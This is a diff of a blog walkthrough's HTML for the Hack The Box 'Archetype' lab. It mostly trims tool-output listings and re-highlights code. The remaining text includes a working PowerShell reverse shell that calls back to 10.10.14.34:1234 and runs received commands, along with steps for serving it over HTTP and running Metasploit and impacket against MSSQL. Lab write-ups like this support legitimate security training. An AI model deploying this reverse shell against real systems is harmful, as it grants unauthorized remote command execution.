@@ -97,7 +97,7 @@
   <span class="article-list-minutes">
     
     
-      19 minute read
+      16 minute read
     
   </span>
   <span class="article-list-divider">-</span>
@@ -133,8 +133,8 @@ Now that you are logged in as <code class="highlighter-rouge">sql_svc</code>, we
 <li>We need to note down your <code class="highlighter-rouge">tun0</code> IP.  On your computer, run: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
 <li>
 We need to put the following into a <code class="highlighter-rouge">shell.ps1</code> file on your computer:
-<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$client</span> <span class="nf">=</span> <span class="nf">New-Object</span> <span class="nf">System.Net.Sockets.TCPClient</span><span class="s">("10.10.14.34", 1234)</span><span class="nf">;$stream</span> <span class="nf">=</span> <span class="nf">$client.GetStream</span><span class="s">()</span><span class="nf">;</span><span class="p">[</span><span class="nf">byte</span><span class="p">[]]</span><span class="nf">$bytes</span> <span class="nf">=</span> <span class="nf">0..65535|</span><span class="c1">%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()</span>
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.10.14.34"</span><span class="p">,</span><span class="w"> </span><span class="mi">1234</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"# "</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 Notice that we have your <code class="highlighter-rouge">tun0</code> IP, with some port number (here we have chosen <code class="highlighter-rouge">1234</code>) near the start of the file;
 </li>
 <li>On your computer, we need to set up an http server for later; run <code class="highlighter-rouge">sudo python3 -m http.server 80</code>.  Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
@@ -209,61 +209,7 @@ Nmap done: 1 IP address (1 host up) scanned in 45.36 seconds
 
 <p>However, I did find <a href="https://resources.infosecinstitute.com/topic/attacking-ms-sql-server-gain-system-access/">this</a> on the web, and keeping in mind my initial thoughts on HTB, this looks very convenient!</p>
 
-<p>From the link, we see that ExploitDB has some things:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ searchsploit mssql  
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                        |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-ADODB 4.6/4.7 - 'Tmssql.php' Cross-Site Scripting                                                                                     | php/webapps/28104.txt
-ADODB &lt; 4.70 - 'tmssql.php' Denial of Service                                                                                         | php/dos/1651.php
-AutoDealer 1.0/2.0 - MSSQL Injection                                                                                                  | php/webapps/12462.txt
-MSSQL 7.0 - Remote Denial of Service                                                                                                  | windows/dos/562.c
-PHP 4.4.6 - 'mssql_[p]connect()' Local Buffer Overflow                                                                                | windows/local/3417.php
-XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow                                                                   | windows/remote/3738.php
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-
-$ searchsploit sql | grep -i 'microsoft'
-CA BrightStor Agent for Microsoft SQL - Remote Overflow (Metasploit)                                                                  | windows/remote/16403.rb
-Microsoft BizTalk Server 2000/2002 DTA - 'RawCustomSearchField.asp' SQL Injection                                                     | asp/webapps/22555.txt
-Microsoft BizTalk Server 2000/2002 DTA - 'rawdocdata.asp' SQL Injection                                                               | asp/webapps/22554.txt
-Microsoft Source Code Analyzer for SQL Injection 1.3 - Improper Permissions                                                           | windows/local/16991.txt
-Microsoft SQL 2000/7.0 - Agent Jobs Privilege Escalation                                                                              | windows/remote/21718.txt
-Microsoft SQL Server - 'sp_replwritetovarbin()' Heap Overflow                                                                         | windows/local/7501.asp
-Microsoft SQL Server - Database Link Crawling Command Execution (Metasploit)                                                          | windows/remote/23649.rb
-Microsoft SQL Server - Distributed Management Objects 'sqldmo.dll' Buffer Overflow (PoC)                                              | windows/dos/4379.html
-Microsoft SQL Server - Distributed Management Objects Buffer Overflow                                                                 | windows/remote/4398.html
-Microsoft SQL Server - Hello Overflow (MS02-056) (Metasploit)                                                                         | windows/remote/16398.rb
-Microsoft SQL Server - Payload Execution (Metasploit)                                                                                 | windows/remote/16395.rb
-Microsoft SQL Server - Payload Execution (via SQL Injection) (Metasploit)                                                             | windows/remote/16394.rb
-Microsoft SQL Server - Resolution Overflow (MS02-039) (Metasploit)                                                                    | windows/remote/16393.rb
-Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (Metasploit)                                                 | windows/remote/16392.rb
-Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (via SQL Injection) (Metasploit)                             | windows/remote/16396.rb
-Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC)                                                                            | windows/dos/21540.txt
-Microsoft SQL Server 2000 - Database Consistency Checkers Buffer Overflow                                                             | windows/remote/21650.txt
-Microsoft SQL Server 2000 - Password Encrypt procedure Buffer Overflow                                                                | windows/local/21549.txt
-Microsoft SQL Server 2000 - Resolution Service Heap Overflow                                                                          | windows/remote/21652.cpp
-Microsoft SQL Server 2000 - sp_MScopyscript SQL Injection                                                                             | windows/remote/21651.txt
-Microsoft SQL Server 2000 - SQLXML Script Injection                                                                                   | windows/remote/21541.txt
-Microsoft SQL Server 2000 - User Authentication Remote Buffer Overflow                                                                | windows/remote/21693.nasl
-Microsoft SQL Server 2000 / Microsoft Jet 4.0 Engine - Unicode Buffer Overflow (PoC)                                                  | windows/dos/21569.txt
-Microsoft SQL Server 7.0 - Remote Denial of Service (1)                                                                               | windows/dos/24639.c
-Microsoft SQL Server 7.0 - Remote Denial of Service (2)                                                                               | windows/dos/24640.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_displayparamstmt Buffer Overflow                                            | windows/local/20451.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_peekqueue Buffer Overflow                                                   | windows/local/20457.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_showcolv Buffer Overflow                                                    | windows/local/20456.c
-Microsoft SQL Server 7.0/2000 / MSDE - Named Pipe Denial of Service (MS03-031)                                                        | windows/dos/22957.cpp
-Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun                                                                | windows/dos/22576.txt
-Microsoft SQL Server 7.0/7.0 SP1 - NULL Data Denial of Service                                                                        | windows/dos/19638.c
-Microsoft SQL Server Management Studio 17.9 - '.xel' XML External Entity Injection                                                    | windows/local/45585.txt
-Microsoft SQL Server Management Studio 17.9 - '.xmla' XML External Entity Injection                                                   | windows/local/45587.txt
-Microsoft SQL Server Management Studio 17.9 - XML External Entity Injection                                                           | windows/local/45583.txt
-Microsoft SQL Server Reporting Services 2016 - Remote Code Execution                                                                  | windows/remote/48816.py
-Microsoft Windows SQL Server - Remote Denial of Service (MS03-031)                                                                    | windows/dos/65.c
-Oracle MySQL for Microsoft Windows - Payload Execution (Metasploit)                                                                   | windows/remote/16957.rb
-</code></pre></div></div>
-
-<p>So, there are a lot of exploits, it seems.  We need to choose one…  We know that the <code class="highlighter-rouge">mssql</code> server version this machine is using is from 2017.</p>
+<p>From the link, we see that ExploitDB has some things.  So, there are a lot of exploits, it seems.  We need to choose one…  We know that the <code class="highlighter-rouge">mssql</code> server version this machine is using is from 2017.</p>
 
 <p>Let’s quickly have a look at the <a href="https://opensource.com/article/18/1/ms-sql-command-line-client">CLI for <code class="highlighter-rouge">mssql</code></a> before we have a go at the metasploit results.  We need to first run:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pip <span class="nb">install </span>mssql-cli
@@ -279,31 +225,8 @@ Oracle MySQL for Microsoft Windows - Payload Execution (Metasploit)             
 
 <p>At this point, I realise I have very little knowledge of how to use metasploit, so I found <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik">this video</a> which helped me understand.  So entering the <code class="highlighter-rouge">msfconsole</code> and we search for exploits:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search type:exploit platform:windows microsoft sql
-
-Matching Modules
-================
-
-   #   Name                                                      Disclosure Date  Rank       Check  Description
-   -   ----                                                      ---------------  ----       -----  -----------
-   0   exploit/multi/mysql/mysql_udf_payload                     2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
-   1   exploit/windows/brightstor/sql_agent                      2005-08-02       average    No     CA BrightStor Agent for Microsoft SQL Overflow
-   2   exploit/windows/http/ssrs_navcorrector_viewstate          2020-02-11       excellent  Yes    SQL Server Reporting Services (SSRS) ViewState Deserialization
-   3   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
-   4   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
-   5   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
-   6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
-   7   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
-   8   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
-   9   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
-   10  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
-   11  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
-   12  exploit/windows/mysql/mysql_mof                           2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
-   13  exploit/windows/mysql/mysql_start_up                      2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
-   14  exploit/windows/postgres/postgres_payload                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
-
-
-Interact with a module by name or index. For example info 14, use 14 or use exploit/windows/postgres/postgres_payload
 </code></pre></div></div>
+
 <p>Recall that we are dealing with Microsoft SQL Server 2017, and only one of these has an Disclosure Date of later than that, so we choose that one:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use exploit/windows/http/ssrs_navcorrector_viewstate
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
@@ -437,15 +360,8 @@ smb: <span class="se">\&gt;</span>
 </code></pre></div></div>
 
 <p>It looks like there is a password and username here!  We recall from Passage that we have Impacket’s <code class="highlighter-rouge">mssqlclient.py</code> script, and we use it here:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/SecureAuthCorp/impacket
-Cloning into <span class="s1">'impacket'</span>...
-remote: Enumerating objects: 41, <span class="k">done</span><span class="nb">.</span>
-remote: Counting objects: 100% <span class="o">(</span>41/41<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-remote: Total 18922 <span class="o">(</span>delta 25<span class="o">)</span>, reused 20 <span class="o">(</span>delta 9<span class="o">)</span>, pack-reused 18881
-Receiving objects: 100% <span class="o">(</span>18922/18922<span class="o">)</span>, 6.27 MiB | 3.79 MiB/s, <span class="k">done</span><span class="nb">.</span>
-Resolving deltas: 100% <span class="o">(</span>14401/14401<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-                                                                                                                                                                        
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/SecureAuthCorp/impacket<span class="p">;</span> 
+
 <span class="nv">$ </span>python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 <span class="nt">-windows-auth</span>
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -519,27 +435,7 @@ SQL&gt;
 <p>And the port to the one you want to use (e.g., <code class="highlighter-rouge">1234</code>).</p>
 
 <p>To host this reverse shell file. we need to set up a mini server.  We do this by, on our machine, running a python command (be sure to do this in the same directory as your powershell reverse shell file!):</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
-Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
-  File <span class="s2">"/usr/lib/python3.9/runpy.py"</span>, line 197, <span class="k">in </span>_run_module_as_main
-    <span class="k">return </span>_run_code<span class="o">(</span>code, main_globals, None,
-  File <span class="s2">"/usr/lib/python3.9/runpy.py"</span>, line 87, <span class="k">in </span>_run_code
-    <span class="nb">exec</span><span class="o">(</span>code, run_globals<span class="o">)</span>
-  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1289, <span class="k">in</span> &lt;module&gt;
-    <span class="nb">test</span><span class="o">(</span>
-  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1244, <span class="k">in </span><span class="nb">test
-    </span>with ServerClass<span class="o">(</span>addr, HandlerClass<span class="o">)</span> as httpd:
-  File <span class="s2">"/usr/lib/python3.9/socketserver.py"</span>, line 452, <span class="k">in </span>__init__
-    self.server_bind<span class="o">()</span>
-  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 1287, <span class="k">in </span>server_bind
-    <span class="k">return </span>super<span class="o">()</span>.server_bind<span class="o">()</span>
-  File <span class="s2">"/usr/lib/python3.9/http/server.py"</span>, line 138, <span class="k">in </span>server_bind
-    socketserver.TCPServer.server_bind<span class="o">(</span>self<span class="o">)</span>
-  File <span class="s2">"/usr/lib/python3.9/socketserver.py"</span>, line 466, <span class="k">in </span>server_bind
-    self.socket.bind<span class="o">(</span>self.server_address<span class="o">)</span>
-PermissionError: <span class="o">[</span>Errno 13] Permission denied
-                                                                                                                                                                        
-<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80                                                                                                                                  1 ⨯
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 <span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jakeireland:
 Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
 </code></pre></div></div>
@@ -685,6 +581,12 @@ C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
 <div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">C:\Windows\system32</span><span class="p">&gt;</span><span class="nf">more</span> <span class="nf">\users\administrator\desktop\root.txt</span>
 <span class="nf">b91c************************8528</span>
 </code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
 
 <h1 id="notes">Notes</h1>
 
